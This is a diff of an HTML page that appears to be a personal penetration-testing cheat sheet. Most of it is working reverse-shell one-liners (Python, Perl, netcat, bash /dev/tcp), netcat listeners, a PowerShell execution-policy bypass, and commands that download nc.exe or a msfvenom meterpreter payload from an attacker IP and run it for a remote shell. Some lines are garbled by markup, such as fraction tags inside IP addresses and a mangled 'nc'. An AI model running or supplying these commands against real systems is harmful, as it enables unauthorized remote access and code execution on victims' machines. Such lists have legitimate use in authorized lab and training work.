@@ -39,35 +39,53 @@
     <div class="post-content">
       
 
-<h3 id="connect">connect</h3>
-
 <p><code><pre>
 python3 -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;10.10.10.10&rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;<br />
 perl -e &lsquo;use Socket;$i=&ldquo;10.10.10.10&rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&ldquo;tcp&rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&ldquo;&gt;&amp;S&rdquo;);open(STDOUT,&ldquo;&gt;&amp;S&rdquo;);open(STDERR,&ldquo;&gt;&amp;S&rdquo;);exec(&ldquo;/bin/sh -i&rdquo;);};&rsquo;<br />
 nc -e /bin/sh 10.0.0.1 1234<br />
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.132 5555 &gt;/tmp/f
 </pre></code></p>
 
-<h3 id="reverse">reverse</h3>
-
-<p><code><pre>
+<p>reverse
+<code><pre>
 bash -i &gt;&amp; /dev/tcp/192.168.100.<sup>113</sup>&frasl;<sub>443</sub> 0&gt;&amp;1<br />
 &rsquo;/bin/bash -c &lsquo;bash -i &gt;&amp; /dev/tcp/192.168.122.<sup>1</sup>&frasl;<sub>2323</sub> 0&gt;&amp;1&rsquo;
 </pre></code></p>
 
-<h3 id="listen">listen</h3>
-
-<p><code><pre>
+<p>listen
+<code><pre>
 nc -lvp 443<br />
 nc -lp 1&gt;/tmp/b
 </pre></code></p>
 
-<h3 id="ipv6">ipv6</h3>
-
-<p><code><pre>
+<p>ipv6
+<code><pre>
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | \n\c -6 -l 6677 &gt; /tmp/f;
 nc -6 localhost 6677
 </pre></code></p>
+
+<h3 id="bypass-to-run-powershell-scripts">bypass to run powershell scripts</h3>
+
+<pre>
+powershell -ExecutionPolicy ByPass -File GetCLSID.ps1
+powershell -ExecutionPolicy ByPass -File MakeREADME.ps1
+</pre>
+
+<h3 id="registry-search">REgistry search</h3>
+
+<pre>
+reg query HKEY_CLASSES_ROOT\CLSID\ /s /F "DCOM"
+</pre>
+
+<h4 id="case-upload-nc-and-connect">case upload nc and connect</h4>
+
+<pre>powershell "Invoke-WebRequest 'http://10.10.12.231:8000/nc.exe' -OutFile 'C:\Users\public\nc.exe'; C:\Users\public\nc.exe -e cmd 10.10.15.149 9000</pre>
+
+<h4 id="case-upload-msvenom-file-and-connect">case upload msvenom file and connect</h4>
+
+<pre>
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.231 LPORT=9000 -f exe -o A.exe
+powershell "Invoke-WebRequest 'http://10.10.12.231:8000/A.exe' -OutFile 'A.exe'"; C:\Users\public\A.exe -e cmd 10.10.15.149 9000
+</pre>
 
     </div>
   </article>
